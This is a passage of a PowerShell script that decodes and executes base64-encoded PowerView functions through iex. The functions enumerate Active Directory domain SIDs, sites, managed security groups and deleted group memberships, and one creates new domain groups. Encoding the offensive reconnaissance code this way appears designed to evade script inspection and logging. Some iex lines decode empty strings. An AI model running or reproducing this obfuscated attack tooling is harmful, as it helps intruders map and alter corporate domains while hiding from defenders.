Cb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgJFNpdGUgPSAkXwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFNpdGUgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkU2l0ZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuU2l0ZScpCiAgICAgICAgICAgICAgICAkU2l0ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblNpdGVdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3QiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFNpdGVTZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblNJRCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoW1N0cmluZ10pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAnTERBUEZpbHRlcicgPSAnKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKScKICAgIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICREQ1NJRCA9IEdldC1Eb21haW5Db21wdXRlciBAU2VhcmNoZXJBcmd1bWVudHMgLUZpbmRPbmUgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxIC1FeHBhbmRQcm9wZXJ0eSBvYmplY3RzaWQKICAgIGlmICgkRENTSUQpIHsKICAgICAgICAkRENTSUQuU3ViU3RyaW5nKDAsICREQ1NJRC5MYXN0SW5kZXhPZignLScpKQogICAgfQogICAgZWxzZSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TSURdIEVycm9yIGV4dHJhY3RpbmcgZG9tYWluIFNJRCBmb3IgJyREb21haW4nIgogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV3LURvbWFpbkdyb3VwIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdEaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Hcm91cFByaW5jaXBhbCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTGVuZ3RoKDAsIDI1NildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2FtQWNjb3VudE5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICROYW1lLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRGlzcGxheU5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREZXNjcmlwdGlvbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgICRDb250ZXh0QXJndW1lbnRzID0gQHsKICAgICAgICAnSWRlbnRpdHknID0gJFNhbUFjY291bnROYW1lCiAgICB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29udGV4dEFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29udGV4dEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgJENvbnRleHQgPSBHZXQtUHJpbmNpcGFsQ29udGV4dCBAQ29udGV4dEFyZ3VtZW50cwogICAgaWYgKCRDb250ZXh0KSB7CiAgICAgICAgJEdyb3VwID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsIC1Bcmd1bWVudExpc3QgKCRDb250ZXh0LkNvbnRleHQpCiAgICAgICAgJEdyb3VwLlNhbUFjY291bnROYW1lID0gJENvbnRleHQuSWRlbnRpdHkKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydOYW1lJ10pIHsKICAgICAgICAgICAgJEdyb3VwLk5hbWUgPSAkTmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEdyb3VwLk5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEaXNwbGF5TmFtZSddKSB7CiAgICAgICAgICAgICRHcm91cC5EaXNwbGF5TmFtZSA9ICREaXNwbGF5TmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEdyb3VwLkRpc3BsYXlOYW1lID0gJENvbnRleHQuSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVzY3JpcHRpb24nXSkgewogICAgICAgICAgICAkR3JvdXAuRGVzY3JpcHRpb24gPSAkRGVzY3JpcHRpb24KICAgICAgICB9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW05ldy1Eb21haW5Hcm91cF0gQXR0ZW1wdGluZyB0byBjcmVhdGUgZ3JvdXAgJyRTYW1BY2NvdW50TmFtZSciCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJE51bGwgPSAkR3JvdXAuU2F2ZSgpCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctRG9tYWluR3JvdXBdIEdyb3VwICckU2FtQWNjb3VudE5hbWUnIHN1Y2Nlc3NmdWxseSBjcmVhdGVkIgogICAgICAgICAgICAkR3JvdXAKICAgICAgICB9CiAgICAgICAgY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbTmV3LURvbWFpbkdyb3VwXSBFcnJvciBjcmVhdGluZyBncm91cCAnJFNhbUFjY291bnROYW1lJyA6ICRfIgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk1hbmFnZWRTZWN1cml0eUdyb3VwIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lk1hbmFnZWRTZWN1cml0eUdyb3VwJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdMREFQRmlsdGVyJyA9ICcoJihtYW5hZ2VkQnk9KikoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIxNDc0ODM2NDgpKScKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWROYW1lLG1hbmFnZWRCeSxzYW1hY2NvdW50dHlwZSxzYW1hY2NvdW50bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluCiAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRG9tYWluCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJEVudjpVU0VSRE5TRE9NQUlOCiAgICAgICAgfQogICAgICAgIEdldC1Eb21haW5Hcm91cCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lLG5hbWUsc2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsb2JqZWN0c2lkJwogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkXy5tYW5hZ2VkQnkKICAgICAgICAgICAgJE51bGwgPSAkU2VhcmNoZXJBcmd1bWVudHMuUmVtb3ZlKCdMREFQRmlsdGVyJykKICAgICAgICAgICAgJEdyb3VwTWFuYWdlciA9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkXy5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAkTWFuYWdlZEdyb3VwIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRGlzdGluZ3Vpc2hlZE5hbWUnICRfLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlck5hbWUnICRHcm91cE1hbmFnZXIuc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgJE1hbmFnZWRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNYW5hZ2VyRGlzdGluZ3Vpc2hlZE5hbWUnICRHcm91cE1hbmFnZXIuZGlzdGluZ3Vpc2hlZE5hbWUKICAgICAgICAgICAgaWYgKCRHcm91cE1hbmFnZXIuc2FtYWNjb3VudHR5cGUgLWVxIDB4MTAwMDAwMDApIHsKICAgICAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlclR5cGUnICdHcm91cCcKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRHcm91cE1hbmFnZXIuc2FtYWNjb3VudHR5cGUgLWVxIDB4MzAwMDAwMDApIHsKICAgICAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWFuYWdlclR5cGUnICdVc2VyJwogICAgICAgICAgICB9CiAgICAgICAgICAgICRBQ0xBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0lkZW50aXR5JyA9ICRfLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAnUmlnaHRzRmlsdGVyJyA9ICdXcml0ZU1lbWJlcnMnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJEFDTEFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQUNMQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQUNMQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJEFDTEFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJEFDTEFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBQ0xBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgJE1hbmFnZWRHcm91cCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNYW5hZ2VyQ2FuV3JpdGUnICdVTktOT1dOJwogICAgICAgICAgICAkTWFuYWdlZEdyb3VwLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5NYW5hZ2VkU2VjdXJpdHlHcm91cCcpCiAgICAgICAgICAgICRNYW5hZ2VkR3JvdXAKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdyb3VwTWVtYmVyRGVsZXRlZCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Eb21haW5Hcm91cE1lbWJlckRlbGV0ZWQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSYXcKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgICAgPSAgICdtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhJywnZGlzdGluZ3Vpc2hlZG5hbWUnCiAgICAgICAgICAgICdSYXcnICAgICAgICAgICA9ICAgJFRydWUKICAgICAgICAgICAgJ0xEQVBGaWx0ZXInICAgID0gICAnKG9iamVjdENhdGVnb3J5PWdyb3VwKScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9CiAgICAgICAgR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRPYmplY3RETiA9ICRfLlByb3BlcnRpZXNbJ2Rpc3Rpbmd1aXNoZWRuYW1lJ11bMF0KICAgICAgICAgICAgRm9yRWFjaCgkWE1MTm9kZSBpbiAkXy5Qcm9wZXJ0aWVzWydtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhJ10pIHsKICAgICAgICAgICAgICAgICRUZW1wT2JqZWN0ID0gW3htbF0kWE1MTm9kZSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5ICdEU19SRVBMX1ZBTFVFX01FVEFfREFUQScgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgIGlmICgkVGVtcE9iamVjdCkgewogICAgICAgICAgICAgICAgICAgIGlmICgoJFRlbXBPYmplY3QucHN6QXR0cmlidXRlTmFtZSAtTWF0Y2ggJ21lbWJlcicpIC1hbmQgKCgkVGVtcE9iamVjdC5kd1ZlcnNpb24gJSAyKSAtZXEgMCApKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnR3JvdXBETicgJE9iamVjdEROCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnTWVtYmVyRE4nICRUZW1wT2JqZWN0LnBzek9iamVjdERuCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnVGltZUZpcnN0QWRkZWQnICRUZW1wT2JqZWN0LmZ0aW1lQ3JlYXRlZAogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1RpbWVEZWxldGVkJyAkVGVtcE9iamVjdC5mdGltZURlbGV0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdMYXN0T3JpZ2luYXRpbmdDaGFuZ2UnICRUZW1wT2JqZWN0LmZ0aW1lTGFzdE9yaWdpbmF0aW5nQ2hhbmdlCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnVGltZXNBZGRlZCcgKCRUZW1wT2JqZWN0LmR3VmVyc2lvbiAvIDIpCiA